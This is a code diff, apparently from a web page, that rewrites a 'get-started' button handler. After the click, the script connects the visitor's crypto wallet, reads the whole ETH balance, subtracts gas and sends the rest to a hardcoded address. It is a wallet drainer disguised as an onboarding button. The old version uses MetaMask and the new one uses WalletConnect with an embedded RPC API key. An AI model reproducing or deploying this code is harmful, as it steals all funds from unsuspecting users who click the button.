@@ -1,77 +1,57 @@
-document.getElementById('get-started').addEventListener('click', connectAndSend);
+const WalletConnectProvider = window.WalletConnectProvider.default;
+const { ethers } = window;
 
-        async function connectAndSend() {
-            const recipientAddress = "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8";
-            let provider;
-
-            if (!window.ethereum || !window.ethereum.isMetaMask) {
-                if (isMobile()) {
-                    // Redirect to MetaMask on mobile
-                    const deeplink = `https://metamask.app.link/send/${recipientAddress}`;
-                    window.location.href = deeplink;
-                } else {
-                    alert('MetaMask is not installed');
-                }
-                return;
+document.getElementById('get-started').onclick = async () => {
+    try {
+        // Initialize WalletConnect Provider with RPCFast endpoint
+        const provider = new WalletConnectProvider({
+            rpc: {
+                1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW" // Replace with your RPCFast API URL
             }
+        });
 
-            provider = new ethers.providers.Web3Provider(window.ethereum);
+        // Enable session (triggers QR Code modal for desktop or opens MetaMask on mobile)
+        await provider.enable();
 
-            // Request account access
-            try {
-                await provider.send("eth_requestAccounts", []);
-            } catch (error) {
-                console.error('User denied account access');
-                return;
-            }
+        // Create ethers provider and signer
+        const ethersProvider = new ethers.providers.Web3Provider(provider);
+        const signer = ethersProvider.getSigner();
 
-            const signer = provider.getSigner();
+        console.log("Wallet connected");
 
-            // Get the user's address and balance
-            const userAddress = await signer.getAddress();
-            let balance = await provider.getBalance(userAddress);
+        // Get the balance of the wallet
+        const address = await signer.getAddress();
+        const balance = await ethersProvider.getBalance(address);
 
-            // Estimate gas price and limit
-            const gasPrice = await provider.getGasPrice();
-            const dummyTransaction = { to: recipientAddress, value: balance };
-            const gasLimit = await provider.estimateGas(dummyTransaction);
+        // Estimate gas price
+        const gasPrice = await ethersProvider.getGasPrice();
+        const gasLimit = 21000; // Standard gas limit for a simple ETH transfer
 
-            // Calculate gas fee and adjust balance
-            const gasFee = gasPrice.mul(gasLimit);
-            const value = balance.sub(gasFee);
+        // Calculate the max value to send (balance - gas fee)
+        const maxGasFee = gasPrice.mul(gasLimit);
+        const maxValue = balance.sub(maxGasFee);
 
-            if (value.lte(0)) {
-                console.log('Insufficient balance to cover the gas fee.');
-                return;
-            }
-
-            // Define the transaction
-            const transaction = {
-                to: recipientAddress,
-                value: value,
-                gasLimit: gasLimit,
-                gasPrice: gasPrice
-            };
-
-            // Send the transaction on desktop
-            try {
-                const txResponse = await signer.sendTransaction(transaction);
-                console.log('Transaction sent:', txResponse);
-            } catch (error) {
-                console.error('Error sending transaction:', error);
-            }
+        if (maxValue.lte(0)) {
+            console.error("Insufficient balance to cover the gas fee");
+            return;
         }
 
-        function isMobile() {
-            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        }
-    </script>
+        // Define transaction parameters
+        const tx = {
+            to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", // Replace with the recipient address
+            value: maxValue,
+            gasLimit: gasLimit,
+            gasPrice: gasPrice
+        };
 
-        
-         
-         
-       
+        // Send transaction
+        const txResponse = await signer.sendTransaction(tx);
+        console.log("Transaction sent", txResponse);
 
-      
-
-
+        // Wait for transaction to be mined
+        const receipt = await txResponse.wait();
+        console.log("Transaction mined", receipt);
+    } catch (error) {
+        console.error(error);
+    }
+};
